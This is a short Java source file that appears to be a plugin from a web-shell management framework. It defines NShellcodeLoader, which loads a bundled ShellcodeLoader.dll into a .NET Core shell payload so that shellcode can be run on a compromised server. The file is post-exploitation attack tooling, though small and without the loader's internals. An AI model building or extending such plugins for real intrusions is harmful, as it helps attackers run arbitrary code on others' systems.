package shells.plugins.netcore;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ShellcodeLoader;
import util.functions;

@PluginAnnotation(
        payloadName = "NetCoreDynamicPayload",
        Name = "ShellcodeLoader",
        DisplayName = "Shellcode"
)
public class NShellcodeLoader extends ShellcodeLoader {
    private static final String CLASS_NAME = "ShellcodeLoader.Run";

    public NShellcodeLoader() {
    }

    public boolean load() {
        if (!this.loadState) {
            this.loadState = this.payload.include(CLASS_NAME,
                    functions.readInputStreamAutoClose(NShellcodeLoader.class.getResourceAsStream("assets/ShellcodeLoader.dll")));
        }
        return this.loadState;
    }

    public String getClassName() {
        return CLASS_NAME;
    }
}
